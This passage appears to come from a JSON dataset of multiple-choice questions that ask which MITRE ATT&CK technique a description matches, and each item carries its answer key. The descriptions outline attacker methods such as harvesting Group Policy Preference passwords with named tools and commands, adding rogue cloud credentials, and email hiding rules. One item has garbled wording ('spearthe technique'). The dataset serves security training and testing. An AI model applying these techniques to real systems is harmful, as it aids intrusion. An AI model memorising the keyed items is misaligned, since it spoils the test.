certificates). Adversaries may also target certificates and related services in order to access other forms of credentials, such as Golden Ticket ticket-granting tickets (TGT) or NTLM plaintext.",
      "options": "A. Modify Authentication Process: Pluggable Authentication Modules, B. Account Manipulation: SSH Authorized Keys, C. Account Manipulation: Additional Email Delegate Permissions, D. Steal or Forge Authentication Certificates",
      "choice": "D. Steal or Forge Authentication Certificates",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to Code Signing, adversaries may develop self-signed code signing certificates for use in operations.\nA. Develop Capabilities: Code Signing Certificates, B. Non-Application Layer Protocol, C. Process Injection: Ptrace System Calls, D. Boot or Logon Initialization Scripts: Logon Script (Windows)\nAnswer:",
    "context": "",
    "output": "A. Develop Capabilities: Code Signing Certificates",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to Code Signing, adversaries may develop self-signed code signing certificates for use in operations.",
      "options": "A. Develop Capabilities: Code Signing Certificates, B. Non-Application Layer Protocol, C. Process Injection: Ptrace System Calls, D. Boot or Logon Initialization Scripts: Logon Script (Windows)",
      "choice": "A. Develop Capabilities: Code Signing Certificates",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use Security Software Discovery and other Discovery/Reconnaissance activities to both discover and verify existing exclusions in a victim environment.\n\nA. Container and Resource Discovery, B. Exfiltration Over Physical Medium, C. Hide Artifacts: File/Path Exclusions, D. Boot or Logon Autostart Execution: Active Setup\nA:",
    "context": "",
    "output": "C. Hide Artifacts: File/Path Exclusions",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use Security Software Discovery and other Discovery/Reconnaissance activities to both discover and verify existing exclusions in a victim environment.",
      "options": "A. Container and Resource Discovery, B. Exfiltration Over Physical Medium, C. Hide Artifacts: File/Path Exclusions, D. Boot or Logon Autostart Execution: Active Setup",
      "choice": "C. Hide Artifacts: File/Path Exclusions",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.\n\nA. Process Injection: Dynamic-link Library Injection, B. Data Staged, C. Brute Force: Password Guessing, D. Process Injection: VDSO Hijacking\nA:",
    "context": "",
    "output": "C. Brute Force: Password Guessing",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "options": "A. Process Injection: Dynamic-link Library Injection, B. Data Staged, C. Brute Force: Password Guessing, D. Process Injection: VDSO Hijacking",
      "choice": "C. Brute Force: Password Guessing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may send the technique messages to gain access to victim systems. All forms of the technique are electronically delivered social engineering. The technique can be targeted, known as spearthe technique. In spearthe technique, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted the technique, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. The technique may also be conducted via third-party services, like social media platforms. The technique may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules). Another way to accomplish this is by forging or spoofing the identity of the sender which can be used to fool both the human recipient as well as automated security tools. \n\nVictims may also receive the technique messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools onto their computer (i.e., User Execution).\n\nA. Exfiltration Over Web Service: Exfiltration to Text Storage Sites, B. Dynamic Resolution, C. Multi-Stage Channels, D. Phishing\nA:",
    "context": "",
    "output": "D. Phishing",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may send the technique messages to gain access to victim systems. All forms of the technique are electronically delivered social engineering. The technique can be targeted, known as spearthe technique. In spearthe technique, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted the technique, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. The technique may also be conducted via third-party services, like social media platforms. The technique may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules). Another way to accomplish this is by forging or spoofing the identity of the sender which can be used to fool both the human recipient as well as automated security tools. \n\nVictims may also receive the technique messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools onto their computer (i.e., User Execution).",
      "options": "A. Exfiltration Over Web Service: Exfiltration to Text Storage Sites, B. Dynamic Resolution, C. Multi-Stage Channels, D. Phishing",
      "choice": "D. Phishing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., Cloud API), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via Application Access Token instead of a username and password.\nA. Hijack Execution Flow: KernelCallbackTable, B. Establish Accounts: Cloud Accounts, C. Remote Services: Cloud Services, D. System Binary Proxy Execution: Odbcconf",
    "context": "",
    "output": "C. Remote Services: Cloud Services",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., Cloud API), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via Application Access Token instead of a username and password.",
      "options": "A. Hijack Execution Flow: KernelCallbackTable, B. Establish Accounts: Cloud Accounts, C. Remote Services: Cloud Services, D. System Binary Proxy Execution: Odbcconf",
      "choice": "C. Remote Services: Cloud Services",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.     Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging.  Adding new capabilities for the adversary\u2019s purpose include Keylogging, Multi-hop Proxy, and Port Knocking.\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot. \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.\nA. User Execution: Malicious File, B. Modify System Image: Patch System Image, C. Indicator Removal, D. Pre-OS Boot: ROMMONkit",
    "context": "",
    "output": "B. Modify System Image: Patch System Image",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.     Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging.  Adding new capabilities for the adversary\u2019s purpose include Keylogging, Multi-hop Proxy, and Port Knocking.\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot. \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.",
      "options": "A. User Execution: Malicious File, B. Modify System Image: Patch System Image, C. Indicator Removal, D. Pre-OS Boot: ROMMONkit",
      "choice": "B. Modify System Image: Patch System Image",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: Social Media or Search Victim-Owned Websites) to craft persuasive and believable lures.\n\nA. Indicator Removal: File Deletion, B. Scheduled Task/Job: At, C. Phishing for Information: Spearphishing Service, D. Hijack Execution Flow: Executable Installer File Permissions Weakness\nAnswer:",
    "context": "",
    "output": "C. Phishing for Information: Spearphishing Service",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: Social Media or Search Victim-Owned Websites) to craft persuasive and believable lures.",
      "options": "A. Indicator Removal: File Deletion, B. Scheduled Task/Job: At, C. Phishing for Information: Spearphishing Service, D. Hijack Execution Flow: Executable Installer File Permissions Weakness",
      "choice": "C. Phishing for Information: Spearphishing Service",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts). For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator. \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to Forge Web Credentials tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.\n\nA. Valid Accounts, B. BITS Jobs, C. Group Policy Discovery, D. Account Manipulation: Additional Cloud Credentials\nA:",
    "context": "",
    "output": "D. Account Manipulation: Additional Cloud Credentials",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts). For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator. \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to Forge Web Credentials tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.",
      "options": "A. Valid Accounts, B. BITS Jobs, C. Group Policy Discovery, D. Account Manipulation: Additional Cloud Credentials",
      "choice": "D. Account Manipulation: Additional Cloud Credentials",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.\n\nPossible answers:\nA. Command and Scripting Interpreter: AutoHotKey & AutoIT, B. System Binary Proxy Execution, C. Search Victim-Owned Websites, D. Indicator Removal: Clear Windows Event Logs",
    "context": "",
    "output": "B. System Binary Proxy Execution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.",
      "options": "A. Command and Scripting Interpreter: AutoHotKey & AutoIT, B. System Binary Proxy Execution, C. Search Victim-Owned Websites, D. Indicator Removal: Clear Windows Event Logs",
      "choice": "B. System Binary Proxy Execution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\nA. Trusted Developer Utilities Proxy Execution, B. Unsecured Credentials: Group Policy Preferences, C. Create or Modify System Process: Systemd Service, D. Exfiltration Over Web Service: Exfiltration to Code Repository",
    "context": "",
    "output": "B. Unsecured Credentials: Group Policy Preferences",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>",
      "options": "A. Trusted Developer Utilities Proxy Execution, B. Unsecured Credentials: Group Policy Preferences, C. Create or Modify System Process: Systemd Service, D. Exfiltration Over Web Service: Exfiltration to Code Repository",
      "choice": "B. Unsecured Credentials: Group Policy Preferences",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> PowerShell cmdlets on Windows systems.\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. \n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).\n\nA. Modify Registry, B. Hide Artifacts: Email Hiding Rules, C. Abuse Elevation Control Mechanism: TCC Manipulation, D. Implant Internal Image\nA:",
    "context": "",
    "output": "B. Hide Artifacts: Email Hiding Rules",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> PowerShell cmdlets on Windows systems.\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. \n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
      "options": "A. Modify Registry, B. Hide Artifacts: Email Hiding Rules, C. Abuse Elevation Control Mechanism: TCC Manipulation, D. Implant Internal Image",
      "choice": "B. Hide Artifacts: Email Hiding Rules",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.\n\nPossible answers:\nA. Gather Victim Network Information: Network Security Appliances, B. Proxy: Domain Fronting, C. Gather Victim Network Information: Network Topology, D. Defacement",
    "context": "",
    "output": "B. Proxy: Domain Fronting",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
